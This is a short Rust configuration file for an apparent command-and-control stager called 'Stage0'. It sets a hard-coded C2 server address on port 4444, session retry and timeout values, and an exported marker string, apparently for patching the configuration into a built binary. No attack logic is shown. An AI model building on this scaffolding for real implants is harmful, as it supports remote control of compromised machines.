//! Configuration for Stage0
pub const C2_SERVER: &str = "192.168.1.104:4444";

pub fn get_c2_server() -> &'static str {
    C2_SERVER
}

pub struct SessionConfig {
    pub timeout: u64,
    pub max_retries: u32,
    pub retry_delay: u64,
}

impl Default for SessionConfig {
    fn default() -> Self {
        Self {
            timeout: 30,
            max_retries: 3,
            retry_delay: 5,
        }
    }
}

#[used]
#[no_mangle]
pub static STAGE0_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE0_CONFIG_MARKER___\0\0\0\0";
